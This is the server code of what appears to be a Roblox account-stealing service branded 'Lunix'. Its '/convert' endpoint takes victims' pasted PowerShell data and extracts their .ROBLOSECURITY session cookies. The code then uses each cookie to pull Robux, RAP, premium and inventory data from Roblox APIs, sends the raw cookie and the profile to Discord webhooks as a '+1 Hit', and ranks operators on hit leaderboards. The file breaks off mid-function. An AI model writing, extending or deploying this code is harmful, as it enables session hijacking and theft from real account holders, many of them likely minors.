import express from 'express';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import fs from 'fs';
import rateLimit from 'express-rate-limit';

// Import Firebase Admin SDK
import admin from 'firebase-admin';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// Firebase Realtime Database Initialization
admin.initializeApp({
  credential: admin.credential.cert({
    projectId: process.env.GOOGLE_PROJECT_ID,
    clientEmail: process.env.GOOGLE_CLIENT_EMAIL,
    privateKey: (process.env.GOOGLE_PRIVATE_KEY || '').replace(/\\n/g, '\n'),
  }),
  databaseURL: process.env.FIREBASE_DB_URL
});

const db = admin.database();

// Directory management
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123'; // Change this!

// Load directories from Firebase
async function loadDirectories() {
  try {
    const snapshot = await db.ref('directories').once('value');
    const directories = snapshot.val();
    return directories || {};
  } catch (error) {
    console.error('Error loading directories from Firebase:', error);
    return {};
  }
}

// Save directories to Firebase
async function saveDirectories(directories) {
  try {
    await db.ref('directories').set(directories);
    console.log('✅ Directories saved to Firebase');
    return true;
  } catch (error) {
    console.error('Error saving directories to Firebase:', error);
    return false;
  }
}

// Generate API token if not set
const API_TOKEN = process.env.API_TOKEN || crypto.randomBytes(32).toString('hex');
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : [];

// Middleware to validate requests
function validateRequest(req, res, next) {
  // Check origin for browser requests
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  // Allow requests from same origin (your frontend)
  if (origin) {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
      console.log(`❌ Blocked request from unauthorized origin`);
      return res.status(403).json({ error: 'Unauthorized origin' });
    }
  }

  // Check for API token in headers
  const providedToken = req.get('X-API-Token');
  if (!providedToken || providedToken !== API_TOKEN) {
    console.log(`❌ Invalid or missing API token from ${req.ip}`);
    return res.status(401).json({ error: 'Invalid API token' });
  }

  next();
}

// Function to log user data to Firebase Realtime Database
async function logUserData(token, userData, context = {}) {
  try {
    // Hash the token for security - never store raw tokens
    const hashedToken = crypto.createHash('sha256').update(token).digest('hex').substring(0, 16);
    
    const logEntry = {
      tokenHash: hashedToken, // Store only hashed version
      userData: userData,
      context: context,
      timestamp: new Date().toISOString(),
    };

    const writeResult = await db.ref('user_logs').push(logEntry);
    console.log(`✅ Logged user data to Firebase Realtime Database with ID: ${writeResult.key}`);
    return writeResult.key;
  } catch (error) {
    console.error('❌ Error logging user data to Firebase Realtime Database:', error);
    return null;
  }
}

// Trust proxy for rate limiting (required for Replit)
app.set('trust proxy', 1);

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later.'
});

app.use(limiter);
app.use(bodyParser.json());
app.use(bodyParser.text({ type: '*/*' }));

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));

// Serve the create directory page
app.get('/create', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'create.html'));
});

// Middleware to protect admin dashboard with password
function requireAdminPassword(req, res, next) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Basic ')) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Area"');
    return res.status(401).json({ error: 'Authentication required' });
  }
  
  const base64Credentials = authHeader.split(' ')[1];
  const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
  const [username, password] = credentials.split(':');
  
  // Check credentials (you can change these)
  const validUsername = process.env.ADMIN_USERNAME || 'admin';
  const validPassword = process.env.ADMIN_PASSWORD || 'admin123';
  
  if (username === validUsername && password === validPassword) {
    next();
  } else {
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Area"');
    return res.status(401).json({ error: 'Invalid credentials' });
  }
}

// Serve the admin dashboard with password protection
app.get('/admin', requireAdminPassword, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin-dashboard.html'));
});

// Endpoint to get API token for frontend
app.get('/api/token', (req, res) => {
  // Only serve token to same origin requests
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  if (origin) {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
      return res.status(403).json({ error: 'Unauthorized' });
    }
  }

  res.json({ token: API_TOKEN });
});

// API endpoint to create new directories
app.post('/api/create-directory', async (req, res) => {
  try {
    const { directoryName, webhookUrl, serviceType, dualhookWebhookUrl } = req.body;

    // Validate directory name
    if (!directoryName || !/^[a-z0-9-]+$/.test(directoryName) || directoryName.length > 50) {
      return res.status(400).json({ error: 'Invalid directory name. Use only lowercase letters, numbers, and hyphens. Max 50 characters.' });
    }

    // Validate webhook URL
    if (!webhookUrl || !webhookUrl.startsWith('http')) {
      return res.status(400).json({ error: 'Invalid primary webhook URL' });
    }

    // Validate dualhook webhook if dualhook service type
    if (serviceType === 'dualhook' && (!dualhookWebhookUrl || !dualhookWebhookUrl.startsWith('http'))) {
      return res.status(400).json({ error: 'Invalid dualhook webhook URL' });
    }

    // Load existing directories
    const directories = await loadDirectories();

    // Check if directory already exists
    if (directories[directoryName]) {
      return res.status(409).json({ error: 'Directory already exists' });
    }

    // Create new directory entry
    const authToken = crypto.randomBytes(32).toString('hex');
    directories[directoryName] = {
      webhookUrl: webhookUrl,
      serviceType: serviceType || 'single',
      dualhookWebhookUrl: serviceType === 'dualhook' ? dualhookWebhookUrl : null,
      created: new Date().toISOString(),
      apiToken: crypto.randomBytes(32).toString('hex'),
      authToken: authToken, // For user dashboard login
      subdirectories: {} // For nested directories in dualhook
    };

    // Save directories
    if (!(await saveDirectories(directories))) {
      return res.status(500).json({ error: 'Failed to save directory configuration' });
    }

    console.log(`✅ Created new directory: ${directoryName}`);

    // Send notification to the webhook about successful directory creation with auth token
    try {
      const serviceTypeLabel = serviceType === 'dualhook' 
        ? `${directoryName.toUpperCase()} GENERATOR` 
        : 'LUNIX AUTOHAR';
      const description = serviceType === 'dualhook' 
        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``
        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``;

      const notificationPayload = {
        embeds: [{
          title: serviceTypeLabel,
          description: description,
          color: 0x8B5CF6,
          footer: {
            text: serviceType === 'dualhook' 
              ? `Made By ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)}`
              : "Made By Lunix"
          }
        }]
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(notificationPayload)
      });

      console.log(`✅ Sent creation notification to webhook for directory: ${directoryName}`);
    } catch (webhookError) {
      console.log(`⚠️ Failed to send creation notification to webhook: ${webhookError.message}`);
      // Don't fail the directory creation if webhook notification fails
    }

    res.json({ 
      success: true, 
      directoryName: directoryName,
      apiToken: directories[directoryName].apiToken,
      authToken: authToken
    });

  } catch (error) {
    console.error('Error creating directory:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Serve login page
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Serve dashboard page
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// API endpoint for user login
app.post('/api/login', async (req, res) => {
  try {
    const { authToken } = req.body;

    if (!authToken) {
      return res.status(400).json({ error: 'Authentication token required' });
    }

    // Load directories and find matching auth token
    const directories = await loadDirectories();
    let foundDirectory = null;

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.authToken === authToken) {
        foundDirectory = dirName;
        break;
      }
      
      // Check subdirectories for dualhook services
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (subConfig.authToken === authToken) {
            foundDirectory = `${dirName}/${subName}`;
            break;
          }
        }
      }
      
      if (foundDirectory) break;
    }

    if (!foundDirectory) {
      return res.status(401).json({ error: 'Invalid authentication token' });
    }

    res.json({
      success: true,
      directoryName: foundDirectory
    });

  } catch (error) {
    console.error('Error during login:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Middleware to authenticate dashboard requests
function authenticateUser(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Authentication required' });
  }
  
  const token = authHeader.split(' ')[1];
  req.userToken = token;
  next();
}

// API endpoint to get user statistics
app.get('/api/user-stats', authenticateUser, async (req, res) => {
  try {
    const authToken = req.userToken;
    
    // Find user's directory
    const directories = await loadDirectories();
    let userDirectory = null;
    
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.authToken === authToken) {
        userDirectory = dirName;
        break;
      }
      
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (subConfig.authToken === authToken) {
            userDirectory = `${dirName}/${subName}`;
            break;
          }
        }
      }
      
      if (userDirectory) break;
    }
    
    if (!userDirectory) {
      return res.status(401).json({ error: 'Invalid token' });
    }

    // Get user logs from Firebase
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};
    
    // Filter logs for this user
    const userLogs = Object.values(allLogs).filter(log => 
      log.context && (log.context.directory === userDirectory || 
      log.context.directory === userDirectory.split('/')[0])
    );

    const today = new Date().toDateString();
    const todayLogs = userLogs.filter(log => {
      const logDate = new Date(log.timestamp).toDateString();
      return logDate === today;
    });

    // Calculate statistics
    const totalAccounts = userLogs.length;
    const totalSummary = userLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const totalRobux = userLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalRAP = userLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);
    
    const todayAccounts = todayLogs.length;
    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    res.json({
      totalAccounts,
      totalSummary,
      totalRobux,
      totalRAP,
      todayAccounts,
      todaySummary,
      todayRobux,
      todayRAP
    });

  } catch (error) {
    console.error('Error getting user stats:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint to get global leaderboards
app.get('/api/leaderboard', async (req, res) => {
  try {
    // Get all logs from Firebase
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};
    
    // Group logs by directory/user
    const userStats = {};
    
    Object.values(allLogs).forEach(log => {
      if (!log.context || !log.context.directory) return;
      
      let directory = log.context.directory;
      let displayName = directory;
      
      // For subdirectories, show only the subdirectory name to hide dualhook structure
      if (log.context.subdirectory) {
        directory = `${log.context.directory}/${log.context.subdirectory}`;
        displayName = log.context.subdirectory; // Only show subdirectory name
      }
      
      if (!userStats[directory]) {
        userStats[directory] = {
          username: displayName, // Use display name instead of full path
          hits: 0,
          lastHit: log.timestamp
        };
      }
      
      userStats[directory].hits++;
      if (new Date(log.timestamp) > new Date(userStats[directory].lastHit)) {
        userStats[directory].lastHit = log.timestamp;
      }
      
      // For dualhook systems: also count hits for the parent directory
      // This ensures parent directories show all their hits in leaderboard (direct + subdirectory hits)
      if (log.context.subdirectory) {
        const parentDirectory = log.context.directory;
        
        if (!userStats[parentDirectory]) {
          userStats[parentDirectory] = {
            username: parentDirectory,
            hits: 0,
            lastHit: log.timestamp
          };
        }
        
        userStats[parentDirectory].hits++;
        if (new Date(log.timestamp) > new Date(userStats[parentDirectory].lastHit)) {
          userStats[parentDirectory].lastHit = log.timestamp;
        }
      }
    });

    // Sort by hits for global leaderboard
    const globalLeaderboard = Object.values(userStats)
      .sort((a, b) => b.hits - a.hits);

    // Create live leaderboard (same data but could be filtered by time)
    const liveLeaderboard = [...globalLeaderboard];

    res.json({
      global: globalLeaderboard,
      live: liveLeaderboard
    });

  } catch (error) {
    console.error('Error getting leaderboard:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint to get live hits
app.get('/api/live-hits', async (req, res) => {
  try {
    // Get recent logs from Firebase
    const logsRef = db.ref('user_logs');
    const recentLogsQuery = logsRef.orderByChild('timestamp').limitToLast(20);
    const snapshot = await recentLogsQuery.once('value');
    const recentLogs = snapshot.val() || {};
    
    // Format for display
    const liveHits = Object.values(recentLogs)
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .slice(0, 5)
      .map(log => ({
        username: log.userData.username || log.context?.directory || 'Unknown',
        timestamp: log.timestamp
      }));

    res.json(liveHits);

  } catch (error) {
    console.error('Error getting live hits:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint for admin stats (protected)
app.get('/api/admin/stats', requireAdminPassword, async (req, res) => {
  try {
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};
    
    const logs = Object.values(allLogs);

    // Calculate all-time stats (not just today)
    const totalUsers = logs.length;
    const totalRobux = logs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalSummary = logs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const premiumUsers = logs.filter(log => log.userData.premium).length;
    
    // Count unique directories from all logs
    const directories = new Set(logs.map(log => log.context?.directory).filter(dir => dir));
    const activeDirectories = directories.size;

    res.json({
      totalUsers,
      totalRobux,
      totalSummary,
      premiumUsers,
      activeDirectories
    });

  } catch (error) {
    console.error('Error getting admin stats:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint for admin logs (protected)
app.get('/api/admin/logs', requireAdminPassword, async (req, res) => {
  try {
    const logsRef = db.ref('user_logs');
    const logsQuery = logsRef.orderByChild('timestamp').limitToLast(50);
    const snapshot = await logsQuery.once('value');
    const logs = snapshot.val() || {};
    
    const formattedLogs = Object.values(logs)
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .map(log => ({
        username: log.userData.username || 'Unknown',
        timestamp: log.timestamp,
        robux: log.userData.robux || 0,
        premium: log.userData.premium || false,
        rap: log.userData.rap || 0,
        directory: log.context?.directory || 'main',
        subdirectory: log.context?.subdirectory || null,
        ip: log.context?.ip || 'Unknown'
      }));

    res.json(formattedLogs);

  } catch (error) {
    console.error('Error getting admin logs:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Function to get CSRF token for Roblox API requests
async function getRobloxCSRFToken(token) {
  try {
    // Try to make any authenticated request to get CSRF token from error response
    const response = await fetch('https://auth.roblox.com/v1/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Roblox/WinInet',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Referer': 'https://www.roblox.com/',
        'Origin': 'https://www.roblox.com'
      }
    });

    const csrfToken = response.headers.get('x-csrf-token');
    return csrfToken;
  } catch (error) {
    return null;
  }
}

// Function to fetch user data from Roblox API
async function fetchRobloxUserData(token) {
  try {
    // Get CSRF token first
    const csrfToken = await getRobloxCSRFToken(token);

    const baseHeaders = {
      'Cookie': `.ROBLOSECURITY=${token}`,
      'User-Agent': 'Roblox/WinInet',
      'Accept': 'application/json',
      'Accept-Language': 'en-US,en;q=0.9',
      'Referer': 'https://www.roblox.com/',
      'Origin': 'https://www.roblox.com'
    };

    if (csrfToken) {
      baseHeaders['X-CSRF-TOKEN'] = csrfToken;
    }

    // Get user info first
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: baseHeaders
    });

    if (!userResponse.ok) {
      // Try alternative endpoint if first fails
      const altUserResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
        method: 'GET',
        headers: baseHeaders
      });

      if (!altUserResponse.ok) {
        return null;
      }

      const altUserData = await altUserResponse.json();

      // For mobile API, try to get actual robux data
      let actualRobux = altUserData.RobuxBalance || 0;
      let pendingRobux = 0;

      return {
        username: altUserData.UserName || "Unknown User",
        userId: altUserData.UserID || 0,
        robux: actualRobux,
        premium: altUserData.IsPremium || false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: pendingRobux,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0, // Will calculate below if possible
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 }
      };
    }

    const userData = await userResponse.json();

    // Get robux data (current + pending)
    let robuxData = { robux: 0 };
    let pendingRobuxData = { pendingRobux: 0 };

    try {
      const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', {
        headers: baseHeaders
      });
      if (robuxResponse.ok) {
        robuxData = await robuxResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    try {
      const pendingResponse = await fetch('https://economy.roblox.com/v1/user/currency/pending', {
        headers: baseHeaders
      });
      if (pendingResponse.ok) {
        pendingRobuxData = await pendingResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get transaction summary data
    let summaryData = { incomingRobux: 0, outgoingRobux: 0 };
    try {
      const summaryResponse = await fetch('https://economy.roblox.com/v2/users/' + userData.id + '/transaction-totals?timeFrame=Year&transactionType=summary', {
        headers: baseHeaders
      });
      if (summaryResponse.ok) {
        summaryData = await summaryResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get premium status using the validate-membership API
    let premiumData = { isPremium: false };
    try {
      const premiumApiUrl = `https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`;

      const premiumResponse = await fetch(premiumApiUrl, {
        headers: baseHeaders
      });

      if (premiumResponse.ok) {
        const premiumValidation = await premiumResponse.json();

        // The API returns a direct boolean value (true/false), not an object
        if (typeof premiumValidation === 'boolean') {
          premiumData.isPremium = premiumValidation;
        } else {
          // Fallback to check object properties if response is an object
          premiumData.isPremium = premiumValidation.isPremium || 
                                  premiumValidation.IsPremium || 
                                  premiumValidation.premium || 
                                  premiumValidation.Premium || 
                                  false;
        }
      } else {
        // Fallback to billing API check
        try {
          const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
            headers: baseHeaders
          });

          if (billingResponse.ok) {
            const billingData = await billingResponse.json();

            // Check if user has premium features via billing
            premiumData.isPremium = billingData.hasPremium || 
                                   billingData.isPremium || 
                                   (billingData.balance && billingData.balance > 0) || 
                                   false;
          } else {
            premiumData.isPremium = false;
          }
        } catch (billingError) {
          premiumData.isPremium = false;
        }
      }
    } catch (e) {
      premiumData.isPremium = false;
    }

    // Get user details for account age
    let ageData = { created: null };
    try {
      const ageResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
        headers: baseHeaders
      });
      if (ageResponse.ok) {
        ageData = await ageResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get groups owned
    let groupsOwned = 0;
    try {
      const groupsResponse = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/roles`, {
        headers: baseHeaders
      });
      if (groupsResponse.ok) {
        const groupsData = await groupsResponse.json();
        groupsOwned = groupsData.data ? groupsData.data.filter(group => group.role.rank === 255).length : 0;
      }
    } catch (e) {
      // Silent handling
    }

    // Get inventory counts with improved accuracy
    let inventoryData = { hairs: 0, bundles: 0, faces: 0 };
    try {
      // Try to get actual inventory via different methods

      // Method 1: Try user inventory endpoint with filtering
      const inventoryResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/inventory?assetTypes=Bundle,Face,Hair,HairAccessory&limit=100`, {
        headers: baseHeaders
      });

      // Method 2: Try the items endpoint specifically
      const itemsResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle,Face,Hair,HairAccessory/1?limit=100`, {
        headers: baseHeaders
      });

      if (itemsResponse.ok) {
        const itemsData = await itemsResponse.json();
        if (itemsData && itemsData.data) {
          inventoryData.bundles = itemsData.data.filter(item => item.assetType === 'Bundle').length;
          inventoryData.faces = itemsData.data.filter(item => item.assetType === 'Face').length;
          inventoryData.hairs = itemsData.data.filter(item => item.assetType === 'Hair' || item.assetType === 'HairAccessory').length;
        }
      }

      // Method 3: Fallback to collectibles endpoint
      if (inventoryData.hairs === 0 && inventoryData.faces === 0 && inventoryData.bundles === 0) {
        // Get bundles specifically
        const bundleResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Bundle&sortOrder=Asc&limit=100`, {
          headers: baseHeaders
        });

        if (bundleResponse.ok) {
          const bundleData = await bundleResponse.json();
          if (bundleData && bundleData.data) {
            inventoryData.bundles = bundleData.data.length;
          }
        }

        // Get hair accessories  
        const hairResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Hair,HairAccessory&sortOrder=Asc&limit=100`, {
          headers: baseHeaders
        });

        if (hairResponse.ok) {
          const hairData = await hairResponse.json();
          if (hairData && hairData.data) {
            inventoryData.hairs = hairData.data.length;
          }
        }

        // Get faces
        const faceResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Face&sortOrder=Asc&limit=100`, {
          headers: baseHeaders
        });

        if (faceResponse.ok) {
          const faceData = await faceResponse.json();
          if (faceData && faceData.data) {
            inventoryData.faces = faceData.data.length;
          }
        }
      }

      // Final fallback: try avatar items if everything else fails
      if (inventoryData.hairs === 0 && inventoryData.faces === 0 && inventoryData.bundles === 0) {
        const avatarResponse = await fetch(`https://avatar.roblox.com/v1/users/${userData.id}/avatar`, {
          headers: baseHeaders
        });
        if (avatarResponse.ok) {
          const avatarData = await avatarResponse.json();
          if (avatarData.assets) {
            inventoryData.hairs = avatarData.assets.filter(asset => asset.assetType && (asset.assetType.name === 'Hair' || asset.assetType.name === 'HairAccessory')).length;
            inventoryData.faces = avatarData.assets.filter(asset => asset.assetType && asset.assetType.name === 'Face').length;
          }
        }
      }
    } catch (e) {
      // Silent handling
    }

    // Get RAP (Limited item values)
    let rapValue = 0;
    try {
      const collectiblesResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
        headers: baseHeaders
      });
      if (collectiblesResponse.ok) {
        const collectiblesData = await collectiblesResponse.json();
        if (collectiblesData.data) {
          rapValue = collectiblesData.data.reduce((total, item) => {
            return total + (item.recentAveragePrice || 0);
          }, 0);
        }
      }
    } catch (e) {
      // Silent handling
    }

    // Calculate account age in days
    let accountAge = 0;
    if (ageData.created) {
      const createdDate = new Date(ageData.created);
      const now = new Date();
      accountAge = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
    }

    // Check for Korblox and Headless
    let hasKorblox = false;
    let hasHeadless = false;
    try {
      const wearingResponse = await fetch(`https://avatar.roblox.com/v1/users/${userData.id}/currently-wearing`, {
        headers: baseHeaders
      });
      if (wearingResponse.ok) {
        const wearingData = await wearingResponse.json();
        if (wearingData.assetIds) {
          hasKorblox = wearingData.assetIds.includes(139607770) || wearingData.assetIds.includes(139607718); // Korblox asset IDs
          hasHeadless = wearingData.assetIds.includes(134082579); // Headless Head asset ID
        }
      }
    } catch (e) {
      // Silent handling
    }

    return {
      username: userData.name || userData.displayName,
      userId: userData.id,
      robux: robuxData.robux || 0,
      premium: premiumData.isPremium || false,
      rap: rapValue,
      summary: summaryData.incomingRobuxTotal || 0,
      creditBalance: 0, // This would require billing API access
      savedPayment: false, // This would require billing API access
      robuxIncoming: summaryData.incomingRobuxTotal || 0,
      robuxOutgoing: summaryData.outgoingRobuxTotal || 0,
      korblox: hasKorblox,
      headless: hasHeadless,
      accountAge: accountAge,
      groupsOwned: groupsOwned,
      placeVisits: 0, // This data is not easily accessible via API
      inventory: inventoryData
    };

  } catch (error) {
    return null;
  }
}

// Function to send custom dualhook webhook with directory branding
async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData = null, webhookUrl, directoryName, subdirectoryName, host) {
  console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');

  if (!webhookUrl) {
    console.log('❌ Discord webhook URL not configured');
    return { success: false, error: 'Webhook URL not configured' };
  }

  try {
    const embed = {
      title: `${directoryName.toUpperCase()} AUTOHAR`,
      description: `Ur ${directoryName.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${host}/${directoryName}/${subdirectoryName}\``,
      color: 0x8B5CF6,
      footer: {
        text: `Made by ${directoryName}`
      }
    };

    const payload = {
      embeds: [embed]
    };

    console.log('Sending custom dualhook webhook payload...');

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });

    console.log('Webhook response status:', response.status);

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Webhook failed with status:', response.status, 'Error:', errorText);
      return { success: false, error: `Webhook failed: ${response.status}` };
    }

    console.log('✅ Successfully sent custom dualhook webhook');
    return { success: true };
  } catch (error) {
    console.error('❌ Failed to send custom dualhook webhook:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

// Function to send Discord webhook with user data (supports custom webhook URLs)
async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown', userData = null, customWebhookUrl = null, customTitle = null) {
  const webhookUrl = customWebhookUrl || process.env.DISCORD_WEBHOOK_URL;

  console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');

  if (!webhookUrl) {
    console.log('❌ Discord webhook URL not configured in environment variables');
    return { success: false, error: 'Webhook URL not configured' };
  }

  try {
    if (userData) {
      // First embed: User data only (without cookie)
      const userDataEmbed = {
        title: customTitle || "🎯 AUTOHAR-TRIPLEHOOK",
        color: 0x8B5CF6,
        fields: [
          {
            name: "👤 Username",
            value: userData.username || "Unknown",
            inline: false
          },
          {
            name: "💰 Robux (Pending)",
            value: `${userData.robux || 0} (0)`,
            inline: true
          },
          {
            name: "👑 Premium",
            value: userData.premium ? "true" : "false",
            inline: true
          },
          {
            name: "💎 RAP",
            value: userData.rap?.toString() || "0",
            inline: true
          },
          {
            name: "📊 Summary",
            value: userData.summary?.toString() || "0",
            inline: true
          },
          {
            name: "💳 Credit Balance",
            value: userData.creditBalance && userData.creditBalance > 0 
              ? `$${userData.creditBalance} (Est. ${Math.floor(userData.creditBalance * 80)} Robux)`
              : "$0",
            inline: true
          },
          {
            name: "💾 Saved Payment",
            value: userData.savedPayment ? "True" : "False",
            inline: true
          },
          {
            name: "💰 Robux Incoming/Outgoing",
            value: `${userData.robuxIncoming || 0}/${userData.robuxOutgoing || 0}`,
            inline: true
          },
          {
            name: "👤 Korblox/Headless",
            value: `${userData.korblox ? "True" : "False"}/${userData.headless ? "True" : "False"}`,
            inline: true
          },
          {
            name: "🎂 Age",
            value: `${userData.accountAge || 0} Days`,
            inline: true
          },
          {
            name: "👥 Groups Owned",
            value: userData.groupsOwned?.toString() || "0",
            inline: true
          },
          {
            name: "🏠 Place Visits",
            value: userData.placeVisits?.toString() || "0",
            inline: true
          },
          {
            name: "🎒 Inventory",
            value: `Hairs: ${userData.inventory?.hairs || 0}\nBundles: ${userData.inventory?.bundles || 0}\nFaces: ${userData.inventory?.faces || 0}`,
            inline: false
          }
        ],
        footer: {
          text: "Made By Lunix"
        }
      };

      // Second embed: Cookie only - display the raw token value in description with code block formatting
      const cookieEmbed = {
        title: "🍪 Cookie",
        description: "```" + token + "```",
        color: 0x8B5CF6,
        footer: {
          text: "Handle with extreme caution!"
        }
      };

      // Send both embeds together in a single message with @everyone notification
      const combinedPayload = {
        content: "@everyone +1 Hit",
        embeds: [userDataEmbed, cookieEmbed]
      };

      console.log('Sending combined user data and cookie embeds...');

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(combinedPayload)
      });

      console.log('Combined embeds response status:', response.status);

      if (!response.ok) {
        const errorText = await response.text();
        console.error('Combined embeds failed with status:', response.status, 'Error:', errorText);
        return { success: false, error: `Combined embeds failed: ${response.status}` };
      }

      console.log('✅ Successfully sent combined user data and cookie embeds to Discord webhook');
      return { success: true };

    } else {
      // Simple embed with just token (for cases without user data)
      const embed = {
        title: "LUNIX AUTOHAR",
        description: `Ur LUNIX AUTOHAR url\n📌\n\n\`${token}\``,
        color: 0x8B5CF6,
        footer: {
          text: "Made By Lunix"
        }
      };

      const payload = {
        embeds: [embed]
      };

      console.log('Sending simple webhook payload...');

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });

      console.log('Webhook response status:', response.status);

      if (!response.ok) {
        const errorText = await response.text();
        console.error('Webhook failed with status:', response.status, 'Error:', errorText);
        return { success: false, error: `Webhook failed: ${response.status}` };
      }

      console.log('✅ Successfully sent to Discord webhook');
      return { success: true };
    }
  } catch (error) {
    console.error('❌ Failed to send Discord webhook:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

// API endpoint to convert PowerShell to .ROBLOSECURITY
app.post('/convert', validateRequest, async (req, res) => {
  try {
    let input;
    let scriptType;

    console.log('📥 Received request');

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
